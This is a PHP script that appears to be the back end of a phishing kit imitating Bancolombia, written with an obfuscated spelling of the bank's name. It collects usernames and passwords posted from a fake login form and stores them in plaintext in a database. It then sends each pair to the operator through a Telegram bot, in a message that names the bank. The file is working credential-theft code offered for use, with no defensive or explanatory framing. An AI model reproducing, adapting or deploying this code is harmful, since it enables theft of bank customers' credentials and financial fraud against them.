<?php
require_once __DIR__ . "/../controllers/conection.php";
require_once __DIR__ . "/../controllers/tg.php";



if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Sanitizar entradas
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pwd'] ?? '');

    // Validaciones mínimas
    if (empty($user) || empty($pass)) {   
        die("Usuario y contraseña son obligatorios");
    }

    // Generar session_id seguro (UUID)
    $session_id = bin2hex(random_bytes(16)); // 32 caracteres hexadecimales


    try {
        $conexion = new PDO(
            "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME,
            DB_USER,
            DB_PASS,
            array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4")
        );
        $conexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $sql = "INSERT INTO sesiones (session_id, user, pass) 
                VALUES (:session_id, :user, :pass)";
        $stmt = $conexion->prepare($sql);
        $stmt->bindParam(':session_id', $session_id);
        $stmt->bindParam(':user', $user);
        $stmt->bindParam(':pass', $pass);
        $stmt->execute();

        echo json_encode([
            "status" => "success",
            "message" => "Sesión creada correctamente",
            "session_id" => $session_id
        ]);
    } catch (PDOException $e) {
        echo json_encode([
            "status" => "error",
            "message" => $e->getMessage()
        ]);
    }

    // Enviar mensaje a Telegram
    $telegram = new Telegram();
    $mensaje = "➖➖➖➖➖➖ \n💰B4NC0LOMB1A💰\n\n ✔️ USR : {$user}\n\n ✔️ PSWD : {$pass}\n\n 🔗 ENLACE: LINK_AL_PANEL_PERSONAL \n\n DESDE EL NEW BOT \n\n ➖➖➖➖➖➖";
    $telegram->enviarMensaje($mensaje);
} else {
    // No hacer nada si no hay POST
    exit();
}
